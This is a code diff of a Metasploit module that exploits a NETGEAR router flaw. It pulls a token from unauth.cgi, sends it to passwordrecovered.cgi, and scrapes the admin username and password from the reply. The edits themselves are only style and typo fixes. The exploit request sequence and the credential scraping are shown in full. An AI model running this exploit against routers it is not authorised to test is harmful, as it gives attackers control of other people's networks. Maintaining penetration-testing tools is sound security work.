@@ -1,4 +1,3 @@
-# -*- coding: binary -*-
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'NETGEAR Administrator Password Disclosure',
       'Description'    => %q{
-        This module will collect the the password for the `admin` user.
+        This module will collect the password for the `admin` user.
         The exploit will not complete if password recovery is set on the router.
         The password is recieved by passing the token generated from `unauth.cgi`
         to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
@@ -46,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # @return substring of 'text', usually a response from a server in this case
   def scrape(text, start_trig, end_trig)
-    return text[/#{start_trig}(.*?)#{end_trig}/m, 1]
+    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
   end
 
   def run
@@ -63,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
       marker_one = "id="
       marker_two = "\""
       token = scrape(res.to_s, marker_one, marker_two)
-      if token == nil
+      if token.nil?
         print_error("#{rhost} is not vulnerable: Token not found")
         return
       end
@@ -71,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
       r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
-      if r.to_s.include?('left">') != nil
+      if r.to_s.include?('left">')
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
         password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
         print_good("Creds found: #{username}/#{password}")
@@ -89,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
   def check                             #NOTE: this is working
     res = send_request_raw({'uri'=>'/'})
     unless res
-      fail_with(Failure::Unknown, 'Connection timed out.')
+      fail_with(Failure::Unreachable, 'Connection timed out.')
     end
 
     data = res.to_s
